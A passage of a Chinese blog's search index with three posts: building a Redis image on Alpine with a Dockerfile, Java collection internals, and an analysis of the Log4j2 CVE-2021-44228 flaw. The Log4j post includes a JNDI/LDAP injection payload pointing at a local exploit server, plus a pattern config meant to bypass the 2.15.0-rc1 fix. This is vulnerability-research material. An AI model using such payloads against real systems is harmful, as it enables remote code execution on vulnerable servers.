.","tags":["nginx"],"categories":["dockerfile"]},{"title":"dockerfile基于alpine构建redis镜像","path":"/2022/06/21/dockerfile基于alpine构建redis镜像/","content":"前言记录一次自己通过dockerfile源码构建redis的血与泪，以及踩过的坑。 坏境docker：20.10.10 redis：5.0.14 alpine：3.16.0 准备先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。 准备redis-5.0.14的源码包(5.0.14版本直达)，也可以去所有版本处自行下载对应的版本。 准备一个redis.conf配置文件，里面主要包含了我们对redis的一些配置，如下其中某些配置需要修改。 1daemonize no 准备完之后文件里面内容如下 1234567╰─$ ls -alhtotal 4040drwxr-xr-x 5 guoying staff 160B Jun 21 00:27 .drwxr-xr-x 7 guoying staff 224B Jun 21 22:44 ..-rw-r--r-- 1 guoying staff 901B Jun 21 01:07 Dockerfile-rw-r--r--@ 1 guoying staff 1.9M Jun 20 23:34 redis-5.0.14.tar.gz-rw-r--r-- 1 guoying staff 57K Jun 21 01:13 redis.conf 编写Dockerfile我们先想想整个dockerfile的步骤 1、首先得基于一个很小的系统（alpine） 1FROM alpine:3.16.0 2、准备好需要的文件（redis源码包），可以在镜像里面下载（太慢）也可以自行拷贝进去，这里选择拷贝进去。 1ADD redis-5.0.14.tar.gz / # 将同级目录的redis源码压缩包放入镜像中（压缩包会自行解压） 3、配置apk的源 12RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories 4、安装需要的依赖 12345678910RUN apk update &amp;&amp; \\ apk add --no-cache --virtual .build-deps \\ # --no-cache表示不缓存 gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev # redis还需要其他依赖，在redis的本地deps目录下面RUN cd /redis-5.0.14/deps &amp;&amp; \\ make lua hiredis linenoise 5、编译redis，指定编译的地址 12RUN cd /redis-5.0.14 &amp;&amp; \\ make PREFIX=/sca/redis install 6、删除编译时候需要运行时候不需要的依赖和多余文件 123456789RUN rm -rf /redis-5.0.14 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev 7、替换配置文件 并且 暴露端口 12COPY ./redis.conf /sca/redis/EXPOSE 6379 8、准备启动参数 1CMD [ &quot;/sca/redis/bin/redis-server&quot;, &quot;/sca/redis/redis.conf&quot;] 这样我们整个dockerfile的文件就如下所示 1234567891011121314151617181920212223242526272829303132333435FROM alpine:3.16.0ADD redis-5.0.14.tar.gz /RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories RUN apk update &amp;&amp; \\ apk add --no-cache --virtual .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev # redis还需要其他依赖，在redis的本地deps目录下面RUN cd /redis-5.0.14/deps &amp;&amp; \\ make lua hiredis linenoise RUN cd /redis-5.0.14 &amp;&amp; \\ make PREFIX=/sca/redis install RUN rm -rf /redis-5.0.14 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev COPY ./redis.conf /sca/redis/EXPOSE 6379CMD [ &quot;/sca/redis/bin/redis-server&quot;, &quot;/sca/redis/redis.conf&quot;] 接下来我们执行docker build -t fire-redis:v1.1.0 . ，等若干分钟之后 好家伙345MB，这谁受得了，我们可以使用docker history b3cf3ac45ad1 (这个是IMAGE ID)查看镜像的制造过程 接下来我们准备对镜像进行瘦身，最主要的一个过程就是对RUN 合并，dockerfile文件如下 12345678910111213141516171819202122232425262728293031FROM alpine:3.16.0ADD redis-5.0.14.tar.gz /RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories &amp;&amp; \\ apk update &amp;&amp; \\ apk add --no-cache --virtual .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev &amp;&amp; \\ cd /redis-5.0.14/deps &amp;&amp; \\ make lua hiredis linenoise &amp;&amp; \\ cd /redis-5.0.14 &amp;&amp; \\ make PREFIX=/sca/redis install &amp;&amp; \\ rm -rf /redis-5.0.14 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev COPY ./redis.conf /sca/redis/EXPOSE 6379CMD [ &quot;/sca/redis/bin/redis-server&quot;, &quot;/sca/redis/redis.conf&quot;] 可以看到大小有很大的缩减 这样子我们就已经制作好了一个redis的镜像，此时使用docker run -d -p 6379:6379 fire-redis:v1.1.1启动容器 常见错误错误1:no such file or directory 12345╰─$ docker build -t fire-nginx:v1.1.0 . 1 ↵[+] Building 0.1s (1/2) =&gt; [internal] load build definition from Dockerfile 0.0s =&gt; =&gt; transferring dockerfile: 2B 0.0sfailed to solve with frontend dockerfile.v0: failed to read dockerfile: open /var/lib/docker/tmp/buildkit-mount956713246/Dockerfile: no such file or directory 解决：Dockerfile写成了DockerFile，注意f小写。 参考https://blog.csdn.net/Struggle99/article/details/124684534","tags":["redis"],"categories":["dockerfile"]},{"title":"Java集合","path":"/2022/04/21/集合/","content":"Collection ListArrayListArrayList是一个Object数组实现的数据结构，线程不安全 默认初始化大小10 1234/** * Default initial capacity. */private static final int DEFAULT_CAPACITY = 10; add方法 12345678910111213141516171819202122232425262728private void add(E e, Object[] elementData, int s) &#123; if (s == elementData.length) // 当下标的长度等于数组长度时候 扩容 elementData = grow(); // 返回扩容后的数组 elementData[s] = e; size = s + 1;&#125;public boolean add(E e) &#123; // 在父类AbstractList中定义，表示被修改的次数，一般与iterator一起使用， // 当modCount与expectCount不一致时，抛出ConcurrentModificationException异常 modCount++; add(e, elementData, size); return true;&#125;public void add(int index, E element) &#123; rangeCheckForAdd(index); // 判断下标的合法性 index&gt;0 &amp;&amp; index &lt;= size modCount++; final int s; Object[] elementData; if ((s = size) == (elementData = this.elementData).length) elementData = grow(); // 扩容操作 System.arraycopy(elementData, index, elementData, index + 1, s - index); // 使用System.arraycopy分配一个新的数组地址，然后降旧的数据拷贝过来 elementData[index] = element; size = s + 1;&#125; grow方法 123456789101112private Object[] grow(int minCapacity) &#123; int oldCapacity = elementData.length; if (oldCapacity &gt; 0 || elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; // 新的数组长度=旧的数组长度+（新增的长度 和 就数组长度的二分之一 中的最大值） int newCapacity = ArraysSupport.newLength(oldCapacity, minCapacity - oldCapacity, /* minimum growth */ oldCapacity &gt;&gt; 1 /* preferred growth */); return elementData = Arrays.copyOf(elementData, newCapacity); &#125; else &#123; return elementData = new Object[Math.max(DEFAULT_CAPACITY, minCapacity)]; &#125; &#125; get方法 1234public E get(int index) &#123; Objects.checkIndex(index, size);//检查下标合法性 return elementData(index); //直接通过下标获取到数据 &#125; ArrayList用数组作为底层数据结构，线程不安全，在新增一个对象的时候，当长度=数组的长度，会进行扩容，将大小扩容到 (当前长度+Math.max(需要新增得长度, 当前长度/2))，扩容的时候，通过Arrays.copyOf()申请一个新的数组地址。当在获取对象的时候直接通过index下标来获取。 性能 查找：通过下标查找，时间复杂度O(1)；通过值查找，时间复杂度O(n)。 顺序插入：直接在最后通过下标获取到数组位置赋值，时间复杂度O(1)，当长度不够时需要扩容。 非顺序插入: 需要将插入位置的数据往后移动。 LinkedListLinkedList底层是采用链表来实现的，也是线程不安全的。 Node类如下 1234567891011private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next; // next节点 Node&lt;E&gt; prev; // prev节点 Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123; this.item = element; this.next = next; this.prev = prev; &#125; &#125; 故得出一个结论 LinkedList是双向链表。 LinkedList插入的基本操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112/** * Links e as first element. */private void linkFirst(E e) &#123; final Node&lt;E&gt; f = first; final Node&lt;E&gt; newNode = new Node&lt;&gt;(null, e, f); first = newNode; if (f == null) last = newNode; else f.prev = newNode; size++; modCount++;&#125;/** * Links e as last element. */void linkLast(E e) &#123; final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++;&#125;/** * Inserts element e before non-null Node succ. */void linkBefore(E e, Node&lt;E&gt; succ) &#123; // assert succ != null; final Node&lt;E&gt; pred = succ.prev; final Node&lt;E&gt; newNode = new Node&lt;&gt;(pred, e, succ); succ.prev = newNode; if (pred == null) first = newNode; else pred.next = newNode; size++; modCount++;&#125;/** * Unlinks non-null first node f. */private E unlinkFirst(Node&lt;E&gt; f) &#123; // assert f == first &amp;&amp; f != null; final E element = f.item; final Node&lt;E&gt; next = f.next; f.item = null; f.next = null; // help GC first = next; if (next == null) last = null; else next.prev = null; size--; modCount++; return element;&#125;/** * Unlinks non-null last node l. */private E unlinkLast(Node&lt;E&gt; l) &#123; // assert l == last &amp;&amp; l != null; final E element = l.item; final Node&lt;E&gt; prev = l.prev; l.item = null; l.prev = null; // help GC last = prev; if (prev == null) first = null; else prev.next = null; size--; modCount++; return element;&#125;/** * Unlinks non-null node x. */E unlink(Node&lt;E&gt; x) &#123; // assert x != null; final E element = x.item; final Node&lt;E&gt; next = x.next; final Node&lt;E&gt; prev = x.prev; if (prev == null) &#123; first = next; &#125; else &#123; prev.next = next; x.prev = null; &#125; if (next == null) &#123; last = prev; &#125; else &#123; next.prev = prev; x.next = null; &#125; x.item = null; size--; modCount++; return element;&#125; 查找操作 12345678910111213141516171819public E get(int index) &#123; checkElementIndex(index); return node(index).item; &#125;Node&lt;E&gt; node(int index) &#123; // 当index在前半边，从前往后找，当index在后半边，从后往前找。 if (index &lt; (size &gt;&gt; 1)) &#123; Node&lt;E&gt; x = first; for (int i = 0; i &lt; index; i++) x = x.next; return x; &#125; else &#123; Node&lt;E&gt; x = last; for (int i = size - 1; i &gt; index; i--) x = x.prev; return x; &#125; &#125; LinkedList是使用双向链表实现，故不存在扩容的说法。 插入：LinkedList提供了linkFirst、linkLast、linkBefore三种插入操作方便，当顺序插入时时间复杂度为O(1)，直接用linkFirst或者linkLast；当在中间固定位置进行插入时候需要先用node(index)定位到具体位置然后使用linkBefore进行插入，查找的时间复杂度为O(n)。 查找：因为LinkedList的链表实现，当查找第一个或者最后一个的时候，由于LinkedList里面有记录first和last的node，所以时间复杂度为O(1)，查找中间的时候会根据当前index在链表的前半位置（从first向后查找）还是后半位置（从last向前查找）来进行查找，时间复杂度为O(n)。 ArrayList和LinkedList比较 查询比较多：1、查找的是第一个或者最后一个的时候，ArrayList和LinkedList一样都是O(1)；2、查找中间元素的时候，ArrayList时间复杂度O(1)，LinkedList时间复杂度O(n)，选ArrayList。 插入比较多：1、顺序插入，LinkedList时间复杂度O(1)，ArrayList时间复杂度O(1)但是长度不够会进行扩容；2、其他位置插入的时候，LinkedList时间复杂度O(n)，ArrayList会进行数组的copy以及长度不够会进行扩容。 Vectorvector基本是对ArrayList的操作加了synchronized关键字，所以是线程安全的。 CopyOnWriteArrayList123final transient Object lock = new Object(); // 用来作为锁的对象private transient volatile Object[] array; // 真正存数据的地方 首先copyOnWriteArrayList会有一个final修饰的lock对象用来当做锁对象，每次进行set add等操作的时候会使用synchronized对这个lock对象进行加锁，然后copyOnWriteArrayList实现了Cloneable接口，主要为后面的clone做准备。 基本操作方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public E get(int index) &#123; return elementAt(getArray(), index);&#125;public E set(int index, E element) &#123; synchronized (lock) &#123; Object[] es = getArray(); E oldValue = elementAt(es, index); if (oldValue != element) &#123; es = es.clone(); es[index] = element; &#125; // Ensure volatile write semantics even when oldvalue == element setArray(es); return oldValue; &#125;&#125;public boolean add(E e) &#123; synchronized (lock) &#123; Object[] es = getArray(); int len = es.length; es = Arrays.copyOf(es, len + 1); es[len] = e; setArray(es); return true; &#125;&#125;public void add(int index, E element) &#123; synchronized (lock) &#123; Object[] es = getArray(); int len = es.length; if (index &gt; len || index &lt; 0) throw new IndexOutOfBoundsException(outOfBounds(index, len)); Object[] newElements; int numMoved = len - index; if (numMoved == 0) newElements = Arrays.copyOf(es, len + 1); else &#123; newElements = new Object[len + 1]; System.arraycopy(es, 0, newElements, 0, index); System.arraycopy(es, index, newElements, index + 1, numMoved); &#125; newElements[index] = element; setArray(newElements); &#125;&#125;public E remove(int index) &#123; synchronized (lock) &#123; Object[] es = getArray(); int len = es.length; E oldValue = elementAt(es, index); int numMoved = len - index - 1; Object[] newElements; if (numMoved == 0) newElements = Arrays.copyOf(es, len - 1); else &#123; newElements = new Object[len - 1]; System.arraycopy(es, 0, newElements, 0, index); System.arraycopy(es, index + 1, newElements, index, numMoved); &#125; setArray(newElements); return oldValue; &#125;&#125; 可以看到get方法是不加锁的，直接从类定义的array数组里面获取值，而add set remove等方法都需要先进行加锁，然后对原先的array数组clone出来一个新的数组，对新数组进行操作，操作完成后赋值给array对象。 SetHashSet1234private transient HashMap&lt;E,Object&gt; map;// Dummy value to associate with an Object in the backing Mapprivate static final Object PRESENT = new Object(); HashSet底层实现使用HashMap，将值存放在HashMap的key里面，value是固定的PRESENT，利用了HashMap的key不重复作用实现了HashSet，所以HashSet是无序、不重复的。 LinkedHashSet代码里面只有四个构造器，调用父类HashSet的构造器，HashSet的实现变成LinkedHashMap，其余操作一致。 TreeSetTreeSet底层使用TreeMap。 QueuePriorityQueue优先级队列，内部采用数组实现平衡二叉堆，n的子节点为2n+1和2(n+1)。 几个重要的参数 1234567891011121314151617181920212223private static final int DEFAULT_INITIAL_CAPACITY = 11; /** * Priority queue represented as a balanced binary heap: the two * children of queue[n] are queue[2*n+1] and queue[2*(n+1)]. The * priority queue is ordered by comparator, or by the elements&#x27; * natural ordering, if comparator is null: For each node n in the * heap and each descendant d of n, n &lt;= d. The element with the * lowest value is in queue[0], assuming the queue is nonempty. */ transient Object[] queue; // non-private to simplify nested class access /** * The number of elements in the priority queue. */ int size; /** * The comparator, or null if priority queue uses elements&#x27; * natural ordering. */ @SuppressWarnings(&quot;serial&quot;) // Conditionally serializable private final Comparator&lt;? super E&gt; comparator; DelayQueue内部实现采用PriorityQueue和ReentrantLock以及Condition。 MapHashMapHashMap的底层采用数组+(链表或者红黑树)来实现，jdk1.7版本和1.8版本还有区别，这里只说1.8版本。 先来一张HashMap数据结构的图 我们先看一下它定义的默认值分别是什么意思。 1234567891011121314151617// 默认的初始化大小为16static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16// 最大的容量大小 1&lt;&lt;30 = 2^30static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;// 默认的扩容因子0.75,达到容量0.75的时候进行扩容static final float DEFAULT_LOAD_FACTOR = 0.75f;// 链表转红黑树的长度static final int TREEIFY_THRESHOLD = 8;// 红黑树转链表的长度static final int UNTREEIFY_THRESHOLD = 6;// 转红黑树的table数组的最小长度static final int MIN_TREEIFY_CAPACITY = 64; HashMap类参数的定义 12345678910// Node的存储地方transient Node&lt;K,V&gt;[] table;// 存储数据的大小transient int size;// 操作的次数transient int modCount;// 需要扩容容量的大小，容量*扩容因子的值。int threshold;// 扩容因子final float loadFactor; Node节点的类参数定义 123456789101112131415161718192021222324252627282930313233343536static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final int hash; final K key; V value; Node&lt;K,V&gt; next; Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123; this.hash = hash; this.key = key; this.value = value; this.next = next; &#125; public final K getKey() &#123; return key; &#125; public final V getValue() &#123; return value; &#125; public final String toString() &#123; return key + &quot;=&quot; + value; &#125; public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value); &#125; public final V setValue(V newValue) &#123; V oldValue = value; value = newValue; return oldValue; &#125; public final boolean equals(Object o) &#123; if (o == this) return true; return o instanceof Map.Entry&lt;?, ?&gt; e &amp;&amp; Objects.equals(key, e.getKey()) &amp;&amp; Objects.equals(value, e.getValue()); &#125;&#125; 分析一下其中主要的几个重要方法 put方法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879public V put(K key, V value) &#123; // 获取key的hash值 return putVal(hash(key), key, value, false, true); &#125; /** * Implements Map.put and related methods. * * @param hash hash for key * @param key the key * @param value the value to put * @param onlyIfAbsent if true, don&#x27;t change existing value * @param evict if false, the table is in creation mode. * @return previous value, or null if none */ final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; // 如果table没初始化 或者 table的长度为0 if ((tab = table) == null || (n = tab.length) == 0) // 执行resize方法初始化table数组 n = (tab = resize()).length; // 如果 数组长度-1 逻辑与 key的hash 作为下标在数组中不存在 if ((p = tab[i = (n - 1) &amp; hash]) == null) // 直接生成新的Node放在table数组里面 tab[i] = newNode(hash, key, value, null); // 说明存在table并且table的对应下标位置有值了 else &#123; Node&lt;K,V&gt; e; K k; // p是table数组的对应下标Node，这里叫pNode // 如果（pNode的hash和key的hash相等）并且（两个的key地址相等 或者两个key equals），直接替换掉pNode。 if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; // 如果pNode是树（红黑树）节点的话 else if (p instanceof TreeNode) // 直接调用putTreeVal存入 e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); // 说明是链表的形式 else &#123; // 递归pNode的next节点 for (int binCount = 0; ; ++binCount) &#123; // 如果不存在next节点了，说明到低了 if ((e = p.next) == null) &#123; // 直接放在p.next节点 p.next = newNode(hash, key, value, null); // 如果binCount大于等于7（默认） 链表转换为为红黑树 // 实际也就是链表长度大于8的时候 进行转换 if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; &#125; // 如果（e的hash和key的hash相等）并且（两个的key地址相等 或者 两个key equals），退出当前循环 if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; &#125; &#125; // 如果存在e if (e != null) &#123; // existing mapping for key // 获取老数据 V oldValue = e.value; // 如果 存在既不插入 或者旧值为空，就赋值 if (!onlyIfAbsent || oldValue == null) e.value = value; // 接口类的方法，LinkedList会实现。 afterNodeAccess(e); return oldValue; &#125; &#125; ++modCount; // (长度+1)达到了需要扩容容量的大小的时候 进行resize扩容 if (++size &gt; threshold) resize(); // 接口类的方法，LinkedList会实现。 afterNodeInsertion(evict); return null; &#125; hash方法12345static final int hash(Object key) &#123; int h; // key的hashCode的高16位和低16位进行异或操作的值 return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; get方法1234567891011121314151617181920212223242526272829public V get(Object key) &#123; Node&lt;K,V&gt; e; return (e = getNode(key)) == null ? null : e.value; &#125; final Node&lt;K,V&gt; getNode(Object key) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n, hash; K k; // table不为空 并且 table的大小大于0 并且 table的大小-1 逻辑与 key的hash() 不为空 if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (first = tab[(n - 1) &amp; (hash = hash(key))]) != null) &#123; // 如果hash相同 并且（两个key地址相等或者equals）直接返回这个Node if (first.hash == hash &amp;&amp; // always check first node ((k = first.key) == key || (key != null &amp;&amp; key.equals(k)))) return first; // 如果当前Node的next节点不为空 if ((e = first.next) != null) &#123; // 如果当前节点是树节点，直接在通过红黑树的方法获取 if (first instanceof TreeNode) return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key); // 反之则是链表，通过next节点一直往下寻找 do &#123; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; &#125; while ((e = e.next) != null); &#125; &#125; return null; &#125; resize方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586final Node&lt;K,V&gt;[] resize() &#123; Node&lt;K,V&gt;[] oldTab = table; // 旧数组容量 int oldCap = (oldTab == null) ? 0 : oldTab.length; // 旧扩容阈值 int oldThr = threshold; // 新的数组容量和扩容阈值 int newCap, newThr = 0; // 旧数组容量&gt;0 if (oldCap &gt; 0) &#123; // 旧数组容量&gt;=最大容量（1&lt;&lt;30） if (oldCap &gt;= MAXIMUM_CAPACITY) &#123; // 设置扩容阈值为最大的int threshold = Integer.MAX_VALUE; // 扩不了容了，直接返回旧table return oldTab; &#125; // 新数组容量扩容一倍 // 如果旧数组容量的两倍&lt;最大容量（1&lt;&lt;30）并且旧容量&gt;=默认的初始化容量（16）， else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp; oldCap &gt;= DEFAULT_INITIAL_CAPACITY) // 新扩容阈值 扩容一倍 newThr = oldThr &lt;&lt; 1; // double threshold &#125; else if (oldThr &gt; 0) // initial capacity was placed in threshold newCap = oldThr; else &#123;// // zero initial threshold signifies using defaults newCap = DEFAULT_INITIAL_CAPACITY; // 默认16 newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); // 默认16*0.75=12 &#125; if (newThr == 0) &#123; // 新扩容阈值为0的时候初始化 float ft = (float)newCap * loadFactor; newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ? (int)ft : Integer.MAX_VALUE); &#125; threshold = newThr; @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap]; table = newTab; if (oldTab != null) &#123; for (int j = 0; j &lt; oldCap; ++j) &#123; Node&lt;K,V&gt; e; if ((e = oldTab[j]) != null) &#123; oldTab[j] = null; if (e.next == null) newTab[e.hash &amp; (newCap - 1)] = e; else if (e instanceof TreeNode) // 是树节点 调用红黑树的方法 ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap); else &#123; // preserve order // 链表节点的话 会将一个链表 分成两个链表，一个挂index，一个挂index+oldCap Node&lt;K,V&gt; loHead = null, loTail = null; Node&lt;K,V&gt; hiHead = null, hiTail = null; Node&lt;K,V&gt; next; do &#123; next = e.next; if ((e.hash &amp; oldCap) == 0) &#123; if (loTail == null) loHead = e; else loTail.next = e; loTail = e; &#125; else &#123; if (hiTail == null) hiHead = e; else hiTail.next = e; hiTail = e; &#125; &#125; while ((e = next) != null); if (loTail != null) &#123; loTail.next = null; newTab[j] = loHead; &#125; if (hiTail != null) &#123; hiTail.next = null; newTab[j + oldCap] = hiHead; &#125; &#125; &#125; &#125; &#125; return newTab;&#125; 链表转树和树转链表当链表长度&gt;8的时候 链表会转树，当树长度&lt;6的时候会转链表，那么为什么不设置成一个数呢 比如7？是为了避免转换的太频繁。 hash计算先获取key的hashCode(); 将key的hashCode高16位与自身进行异或操作，得到的值即为hash值 为什么要这么做？ 是为了扰动的均衡一点。 jdk1.7 1234567891011121314final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; // 先取key的hashCode再和hashSeed进行异或运算 h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4); &#125; jdk1.8 12345static final int hash(Object key) &#123; int h; // key的hashCode的高16位和低16位进行异或操作的值 return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 为什么从jdk1.7到1.8扰动次数变少？ 我觉得可能是扰动2次效果差不了多少并且操作次数还变少了。 为什么hashMap的扩容一直是2的倍数？这个就要从如何在table里面的定位说起了，首先获取到key的hash，然后将(hash &amp; n-1)来定位到在table的位置，那么为什么要&amp;上n-1呢，我们都知道n是数组的长度，当n为2的倍数时候， 比如n=16，n-1的二进制就是1111，和hash进行逻辑与操作的时候，最后二进制的后四位决定了在table的位置。 当扩容一倍 也就是n=32的时候，n-1的二进制就是11111，和hash进行逻辑与操作的时候，最后二进制的后五位决定了在table的位置。 这就会造成一个现象，举个例子，比如说之前在2这个位置上的Node节点，原先是不管第五位二进制的，现在要管的话要么是0要么 是1，是0的话那么他的位置不变还是在2这个位置上，是1的话说明他在2+16=18的位置上。 这样在进行扩容操作的时候不需要像hashTable一样一个一个进行操作，只要对一个table节点里面的链表或者红黑树进行操作，要么还在当前位置，要么在当前+oldCap的位置。 hashMap是如何解决hash冲突的？hashMap是通过链地址法的方式解决hash冲突的，具体就是通过数组+链表（或红黑树）的方式。 解决hash冲突的几种办法：开发定址法、再hash法、链地址法、建立公共溢出区等。 参考文献： ​ https://tech.meituan.com/2016/06/24/java-hashmap.html HashTable遗留类，数组+链表(头插法)，使用synchronized确保线程安全，同时与ConcurrentHashMap相比性能低，扩容rehash过程是先生成一个新的entry数组，然后将旧的数据一个一个放进来。 ConcurrentHashMapLinkedHashMapWeakHashMapTreeMapEnumMap","tags":["Java"],"categories":["Java"]},{"title":"log4j2(CVE-2021-44228)漏洞分析","path":"/2021/12/12/log4j2-CVE-2021-44228-漏洞分析/","content":"介绍log4j 2是apache官方出品的日志框架，是对log4j的一个升级，目前在很多厂商的java项目中被广泛使用，影响力广泛，在2021年11月24日被阿里云团队发现。 漏洞编号：CVE-2021-44228 危害等级：严重 CVSS评分：10 影响版本：Apache Log4j 2.x &lt; 2.15.0 复现poc如下： 1234public static void main(String[] args) throws Exception &#123; System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;); logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/Exploit&#125;&quot;);&#125; 成功利用截图： 代码分析首先从logger.error()方法进去进入第一个关键点logIfEnabled方法，在当前方法的做了一个isEnabled判断，主要是将当前的日志打印级别（logger.error()就是error）和配置的默认级别比较，这也就是为什么logger.info不会触发，而logger.error()会。 然后沿着logMessage方法往下看，中间很多就跳过了，发现他会进入一个PatternLayout的方法，这个方法有很多个PatternFormatter对打印的日志进行格式处理，其中有个PatternFormatter里面有个converter对象的实现为MessagePatternConverter，这个也就是导致漏洞发生的类，在后面的log4j-2.15.0-rc1版本也就是对当前类做了修改。 然后来到MessagePatternConverter这个类的format方法。 可以看到上图红色方框里面的代码，当判断你打印的格式为 ${ 开头就进入replace的这个方法来进行替换，依次进入replace方法-&gt;substitute-&gt;substitute，发现有个resolveVariable的方法处理了变量。 进入resolveVariable方法，发现最后执行了resolver.lookup()的方法，resolver的实现是Interpolator这个类。 进入Interpolator，他通过对poc里面jndi:ldap://127.0.0.1:1389/Exploit获取第一个冒号之前的作为key来map中获取对应的LookUp，可以看到map中又这么多类型的LookUp，这里利用的是jndi的JndiLookUp这个类。 JndiLookUp中又有个JndiManager，又调用了JndiManager的lookUp方法 然后他会调用到LdapCtx的c_lookup方法获取到一个LdapResult对象。 然后调用DirectoryManager.getObjectInstance，这var3是个Reference类型。 在进入就是getObjectFactoryFromReference方法，这里面有class.forName()，然后就加载了类，同时也执行了命令。 最终的地方 整体下来有个疑惑的点，就是不知他通过ldap调过来的class文件放哪了，还需要深入学习，有师傅知道的话，感谢能够告知。 至此2.x到2.14.1版本的log4j漏洞复现完毕，接下来看log4j的log4j-2.15.0-rc1版本的绕过。 我开始clone log4j的源代码，并切换到log4j-2.15.0-rc1版本，发现大体上有两处的改动，第一处是前面有说过的MessagePatternConverter这个实现类，apache官方将这个类添加了四个内部实现类，并且将format这个方法在子类里面进行了实现，如下图所示。 format方法如下 会发现四个实现类里面有个LookupMessagePatternConverter的类就是利用点，如下图所示。 但是发现根本到不了这个LookupMessagePatternConverter类，默认去的是SimpleMessagePatternConverter。 我们想要的是进入LookupMessagePatternConverter这个类，所以我看了一下这个formatters的数据由来，发现他通过分析日志的pattern格式（如：%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n ）来选择PatternConverter，比如发现有%d{HH:mm:ss.SSS}就会通过反射来创建一个DatePatternConverter类，所以我这里就想要通过配置文件来让反射出我想要的类，于是配置的xml文件如下，主要添加的就是%msg后面的{lookups}这个。 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;!-- 具体就是%msg后面的&#123;lookups&#125;这个会使后续的代码反射出LookupMessagePatternConverter --&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg&#123;lookups&#125;%n&quot;/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;error&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; 